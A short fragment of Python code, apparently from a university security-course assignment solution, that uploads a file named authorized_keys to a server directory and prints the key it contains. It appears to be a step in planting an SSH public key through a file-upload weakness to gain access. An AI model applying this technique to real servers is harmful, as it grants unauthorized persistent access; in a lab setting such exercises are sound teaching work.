...
def upload_file(file_path, server_url, target_directory):
  ...
  files = {'file': (file_name, open('/workspaces/softwaresikkerhet-assignment4/code/solution/Intranet-level-2/dropbox/authorized_keys', 'rb'))}
...
with open('/workspaces/softwaresikkerhet-assignment4/code/solution/Intranet-level-2/dropbox/authorized_keys', 'rb') as f:
    id_rsa_pub = f.read()
print(id_rsa_pub)